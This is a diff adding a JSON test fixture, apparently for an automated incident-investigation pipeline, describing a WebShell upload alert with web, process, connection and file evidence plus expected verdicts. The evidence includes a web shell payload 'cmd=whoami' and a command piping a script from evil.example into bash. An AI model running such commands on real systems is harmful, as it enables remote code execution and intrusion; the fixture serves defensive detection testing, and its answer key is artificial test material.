@@ -1,0 +1,82 @@
+{
+  "investigation_intent": "WebShell 上传告警后是否有命令执行与外连，确认攻击是否成功",
+  "scenario": "S4",
+  "params": {
+    "attacker_ip": "203.0.113.10",
+    "target_ip": "192.0.2.10",
+    "alert_time": "2026-06-21T09:10:00+08:00",
+    "time_window_minutes": 30
+  },
+  "completeness_precheck": {
+    "overall_verdict": "full_traceable",
+    "confidence": 0.88,
+    "next_skill_blocked": false,
+    "data_gaps": []
+  },
+  "primary_alerts": [
+    {
+      "alert_id": "WAF-20260621-002",
+      "timestamp": "2026-06-21T09:10:05+08:00",
+      "src_ip": "203.0.113.10",
+      "target_ip": "192.0.2.10",
+      "url": "/upload/shell.php",
+      "rule_name": "PHP Injection",
+      "payload": "cmd=whoami",
+      "action": "logged",
+      "host": "web-01"
+    }
+  ],
+  "correlated_evidence": {
+    "web_access_log": [
+      {
+        "evidence_id": "web-101",
+        "src_ip": "203.0.113.10",
+        "target_ip": "192.0.2.10",
+        "timestamp": "2026-06-21T09:10:04+08:00",
+        "url": "/upload/shell.php",
+        "status": 200,
+        "upstream_status": 200
+      }
+    ],
+    "host_exec": [
+      {
+        "evidence_id": "exec-101",
+        "host": "web-01",
+        "host_ip": "192.0.2.10",
+        "timestamp": "2026-06-21T09:12:30+08:00",
+        "listener_process": "nginx",
+        "listener_port": 443,
+        "command": ["/bin/sh", "-c", "curl http://evil.example/a.sh | bash"]
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-101",
+        "host": "web-01",
+        "host_ip": "192.0.2.10",
+        "timestamp": "2026-06-21T09:12:28+08:00",
+        "listener_process": "nginx",
+        "listener_port": 443,
+        "dst_ip": "198.51.100.5",
+        "dst_port": 80
+      }
+    ],
+    "host_file_op": [
+      {
+        "evidence_id": "file-101",
+        "host": "web-01",
+        "host_ip": "192.0.2.10",
+        "timestamp": "2026-06-21T09:11:50+08:00",
+        "path": "/var/www/html/upload/shell.php",
+        "action": "create"
+      }
+    ]
+  },
+  "_meta": {
+    "scenario_label": "S4 WebShell 命中后 D2 exec+connect 确认成功",
+    "expected_alert_verdict": "confirmed_attack",
+    "expected_attack_outcome": "success_confirmed",
+    "expected_attack_success": true,
+    "expected_next_skill": "traceability_analysis"
+  }
+}
